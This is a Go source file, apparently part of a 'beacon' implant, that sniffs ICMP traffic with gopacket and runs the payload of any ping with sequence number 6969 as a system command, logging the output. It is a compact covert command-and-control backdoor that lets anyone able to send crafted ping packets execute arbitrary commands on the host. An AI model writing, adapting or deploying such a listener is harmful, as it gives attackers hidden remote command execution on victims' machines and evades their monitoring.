package inicmp

/*
[x] opens filter and reads from en0
[x] captures icmp packets


*/

import (
	e "beacon/exec"
	"log"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func Filter() {
	// Open network interface or pcap file for capturing
	handle, err := pcap.OpenLive("lo0", 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Set a filter to capture only ICMP packets
	err = handle.SetBPFFilter("icmp")
	if err != nil {
		log.Fatal(err)
	}

	// Start capturing packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		// Process ICMP packets
		if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
			icmpPacket, _ := icmpLayer.(*layers.ICMPv4)
			if icmpPacket.Seq == 6969 {
				cmd := string(icmpPacket.Payload)
				out, err := e.RunCMD(cmd)
				if err != nil {
					log.Fatal(err.Error())
				}
				log.Println(string(out))
			}
		}
	}
}
